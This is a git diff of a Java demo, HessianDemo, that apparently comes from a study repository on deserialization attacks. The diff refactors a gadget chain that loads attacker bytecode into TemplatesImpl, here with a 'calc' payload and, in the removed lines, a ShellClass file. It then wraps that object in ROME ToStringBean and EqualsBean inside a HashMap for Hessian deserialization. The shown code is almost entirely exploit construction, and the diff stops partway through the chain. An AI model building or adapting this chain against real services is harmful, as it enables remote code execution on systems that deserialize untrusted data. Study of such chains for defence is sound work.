@@ -1,5 +1,6 @@
 package Seri.Hessian;
 
+import Seri.Utils;
 import com.caucho.hessian.io.HessianInput;
 import com.rometools.rome.feed.impl.EqualsBean;
 import com.rometools.rome.feed.impl.ToStringBean;
@@ -17,14 +18,9 @@ import static Seri.Utils.*;
 
 public class HessianDemo {
     public static void main(String[] args) throws Exception {
-        TemplatesImpl templateImpl = new TemplatesImpl();
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
-        byte[] bytes = Files.readAllBytes(Paths.get("target/classes/Seri/ShellClass.class"));
-        setValue(templateImpl,"_bytecodes",new byte[][]{bytes});
-        setValue(templateImpl,"_name","aaa");
-        setValue(templateImpl,"_tfactory",new TransformerFactoryImpl());
-
-        ToStringBean toStringBean = new ToStringBean(Templates.class,templateImpl);
+        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
         EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);
         HashMap hashMap = new HashMap();
         hashMap.put(equalsBean,123);
